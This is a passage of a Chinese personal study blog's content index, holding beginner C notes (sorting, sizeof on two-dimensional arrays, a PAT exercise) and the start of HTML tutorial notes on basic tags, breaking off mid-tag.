<span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    bubble_sort(arr, sz, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]), cmp_int);</span><br><span class="line">    print_arr(arr, sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="折半排序"><a href="#折半排序" class="headerlink" title="折半排序"></a>折半排序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">CelerityRun</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> <span class="built_in">array</span>[])</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    CelerityRun(<span class="number">0</span>, <span class="number">9</span>, a);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, a[i]);</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">4</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">CelerityRun</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> <span class="built_in">array</span>[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> middle,iTemp;</span><br><span class="line">    i = left;</span><br><span class="line">    j = right;</span><br><span class="line">    middle = <span class="built_in">array</span>[(left+right) / <span class="number">2</span>]; <span class="comment">//求中间值 </span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>((<span class="built_in">array</span>[i] &lt; middle) &amp;&amp; (i &lt; right)) <span class="comment">//从左找小于中间值的数 </span></span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">while</span>((<span class="built_in">array</span>[j] &gt; middle) &amp;&amp; (j &gt; left)) <span class="comment">//从右找大于中间值的数 </span></span><br><span class="line">            j--;</span><br><span class="line">        <span class="keyword">if</span> (i &lt;= j)</span><br><span class="line">        &#123;</span><br><span class="line">            iTemp = <span class="built_in">array</span>[i];</span><br><span class="line">            <span class="built_in">array</span>[i] = <span class="built_in">array</span>[j];</span><br><span class="line">            <span class="built_in">array</span>[j] = iTemp;</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(i &lt;= j);</span><br><span class="line">    <span class="comment">/* 递归左半边 */</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; j)</span><br><span class="line">        CelerityRun(left, j, <span class="built_in">array</span>);</span><br><span class="line">    <span class="comment">/* 递归右半边 */</span> </span><br><span class="line">    <span class="keyword">if</span> (right &gt; i)</span><br><span class="line">        CelerityRun(i, right, <span class="built_in">array</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/19/WOIY92Lg7FAVKlo.png" alt="image.png"></p><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a));<span class="comment">//48=3*4*sizeof(int) </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">0</span>][<span class="number">0</span>]));<span class="comment">//4 - a[0][0]-是第一行第一个元素 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">0</span>]));<span class="comment">//16 第一行 4*4个int </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">0</span>]+<span class="number">1</span>));<span class="comment">//4</span></span><br><span class="line">                                         <span class="comment">/*a[0]作为数组名并没有单独放在sizeof内部 </span></span><br><span class="line"><span class="comment">                                         *也没取地址，所以a[0]是第一行第一个算的地址 </span></span><br><span class="line"><span class="comment">                                         *a[0]+1，就是第一行第二个元素的地址 </span></span><br><span class="line"><span class="comment">                                         *</span></span><br><span class="line"><span class="comment">                                         */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*(a[<span class="number">0</span>]+<span class="number">1</span>)));<span class="comment">//*(a[0]+1)==a[0][1] int 4 byte 第一行第二个元素 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a+<span class="number">1</span>));<span class="comment">//4/8  a是首元素地址，而二维数组数组名的首元素是第一行，</span></span><br><span class="line">                                     <span class="comment">//第一行的地址+1就是第二行的地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*(a+<span class="number">1</span>)));<span class="comment">//16 对第二行解引用，有4个元素， </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(&amp;a[<span class="number">0</span>]+<span class="number">1</span>));<span class="comment">//4/8 第一行的地址+1就是第二行的地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*(&amp;a[<span class="number">0</span>]+<span class="number">1</span>)));<span class="comment">//16 第二行解引用 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*a));<span class="comment">//16 首元素即第一行地址，再解引用 ，没有&amp;没有单独放在sizeof内部 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">3</span>]));<span class="comment">//16 a[3]其实是第四行的数组名，（如果有的话）</span></span><br><span class="line">                                      <span class="comment">// 所以其实不存在，但是也能通过类型计算大小 </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/25/p3ZUYXCMebPDJ2o.png" alt="image.png"><br>3+5<br>表达式</p><ol><li>值属性 8</li><li>类型性 int</li><li>a[3属]的类型 - int [4]</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">short</span> s = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(s = a + <span class="number">6</span>));<span class="comment">//2 由s决定 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s);<span class="comment">//5  sizeof内部的表达式不会计算,只看类型</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="总结：数组名的意义"><a href="#总结：数组名的意义" class="headerlink" title="总结：数组名的意义"></a>总结：数组名的意义</h4><ol><li>sizeof(数组名)，这里的数组名表示整个数组，计算的是整个数组的大小</li><li>&amp;数组名，这里的数组名表示整个数组，取出的是整个数组的地址</li><li>除此之外所有的数组名都表示首元素的地址</li></ol><h2 id="PAT-答题卡"><a href="#PAT-答题卡" class="headerlink" title="PAT 答题卡"></a>PAT 答题卡</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Iswhat</span><span class="params">(<span class="type">char</span> a[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(a);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i] == <span class="string">&#x27;;&#x27;</span>)&#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[i] == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">            flag = <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line"> &#125; </span><br><span class="line"> <span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">char</span> s[])</span></span><br><span class="line"> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        s[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n ,m, x, y;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">6</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">90</span>][<span class="number">90</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            a[i][j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        init(s);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="keyword">if</span> (Iswhat(s) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;%s &quot;, s);</span></span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, len);</span><br><span class="line">            <span class="keyword">if</span> (len == <span class="number">1</span>) &#123;</span><br><span class="line">                x = <span class="number">0</span>;</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>) - <span class="number">1</span>;</span><br><span class="line">                 </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">2</span>) &#123;</span><br><span class="line">                x = <span class="number">0</span>;</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">3</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//printf(&quot;%d %d\n&quot;, x, y);</span></span><br><span class="line">            a[n - y][x - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (Iswhat(s) == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="keyword">if</span>(len == <span class="number">5</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">5</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">3</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">                <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[j] == <span class="string">&#x27;;&#x27;</span>) &#123;</span><br><span class="line">                        index = j;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">2</span>) &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            a[n - y][x - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">            <span class="keyword">if</span>(len == <span class="number">5</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">5</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(len == <span class="number">3</span>) &#123;</span><br><span class="line">                x = <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">                <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(s[j] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                        index = j;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">if</span> (index == <span class="number">2</span>) &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    x = <span class="type">int</span>(s[len - <span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + <span class="type">int</span>(s[len - <span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                    y = <span class="type">int</span>(s[len - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            a[n - y][x - <span class="number">1</span>] = <span class="string">&#x27;#&#x27;</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html学习笔记</title>
      <link href="/2023/03/03/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/03/html%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一步：安装好要用的编辑器"><a href="#第一步：安装好要用的编辑器" class="headerlink" title="第一步：安装好要用的编辑器"></a>第一步：安装好要用的编辑器</h1><p>我这里用的是Sublime Text</p><p>我自己看的学习视频 <a href="https://www.bilibili.com/video/BV11t411K74Q/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">HTML学习视频</a>。</p><h1 id="第二步：新建HTML文件"><a href="#第二步：新建HTML文件" class="headerlink" title="第二步：新建HTML文件"></a>第二步：新建HTML文件</h1><p><em>在用Sublime Text编写html文件时会自动补全.</em></p><h2 id="我的第一个HTML"><a href="#我的第一个HTML" class="headerlink" title="我的第一个HTML"></a>我的第一个HTML</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、这是HTML的注释</span></span><br><span class="line"><span class="comment">2、支持多行注释</span></span><br><span class="line"><span class="comment">3、不区分大小写，语法松散不严格</span></span><br><span class="line"><span class="comment">4、但最好还是按结构写</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span> <span class="comment">&lt;!--加上这句话就是H5，去掉则是H4.0--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--根--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--头部--&gt;</span>   <span class="comment">&lt;!--注意缩进--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>网页的标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span> <span class="comment">&lt;!--显示在标签页一栏--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="comment">&lt;!--主体--&gt;</span></span><br><span class="line">网页的主体内容,和老杜学习HTML</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> <span class="comment">&lt;!--大小写无所谓--&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://postimg.cc/hhCXWfC8"><img src="https://i.postimg.cc/7Y40zz0R/1.png" alt="1.png"></a></p><h2 id="基本标签"><a href="#基本标签" class="headerlink" title="基本标签"></a>基本标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> <span class="comment">&lt;!--&lt;mata&gt;标签永远位于head元素内部，这里加上</span></span><br><span class="line"><span class="comment">charset属性是为了规定 HTML 文档的字符编码。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--name属性中的viewport表示页面视图的属性下面设置是为了让网页的宽度自动适应，initial-scale:控制页面最初加载时的在在idealviewport下缩放等级，通常设为1，可以是小数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML基本标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--段落标记--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>《三国演义》是罗贯中在有关三国故事的宋元话本、戏曲和轶事传闻的基础上，依据晋代陈寿所著的《三国志》以及南朝宋人裴松之为《三国志》所作的注，所进行的加工再创作。<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>该作品成书后有嘉靖壬午本等多个版本传于世，到了明末清初，毛宗岗对《三国演义》整顿回目、修正文辞、改换诗文，该版本也成为诸多版本中水平最高、流传最广的版本。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--标题字,是HTML的预留字，和word中的标题字一样--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>标题字<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--最多六个--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--换行--&gt;</span><span class="comment">&lt;!--&lt;br&gt;是独目标记--&gt;</span></span><br><span class="line">hello </span><br><span class="line">world!</span><br><span class="line">hello<span class="tag">&lt;<span class="name">br</span>&gt;</span> world1</span><br><span class="line"></span><br><span class="line">&lt;！--横线(独目)--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--color和width都是hr标签的属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span> <span class="attr">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span><span class="comment">&lt;!--单双引号没有要求但一定要写--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--预留格式(否则都在一条直线上)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br><span class="line">for(int i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">printf(&quot;NB&quot;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span>删除字<span class="tag">&lt;/<span class="name">del</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ins</span>&gt;</span>插入字<span class="tag">&lt;/<span class="name">ins</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>粗体字<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>斜体字<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--10的平方--&gt;</span></span><br><span class="line">10<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--角标--&gt;</span></span><br><span class="line">10<span class="tag">&lt;<span class="name">sub</span>&gt;</span>m<span class="tag">&lt;/<span class="name">sub</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--字体标签--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span> <span class="attr">size</span>=<span class="string">&quot;59&quot;</span>&gt;</span>字体标签<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 